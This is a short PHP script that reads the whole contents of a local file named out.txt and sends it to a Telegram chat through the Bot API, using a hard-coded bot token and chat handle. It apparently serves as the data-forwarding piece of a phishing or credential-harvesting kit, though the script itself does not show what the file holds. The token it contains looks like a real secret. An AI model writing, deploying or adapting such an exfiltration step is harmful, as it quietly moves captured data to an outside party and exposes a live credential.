<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2046843299:AAGLM-GIBagDyOWqm8Uxs3f88HGujS17lfc/sendMessage?chat_id=@ilyaking7780&text=$msg");
?>
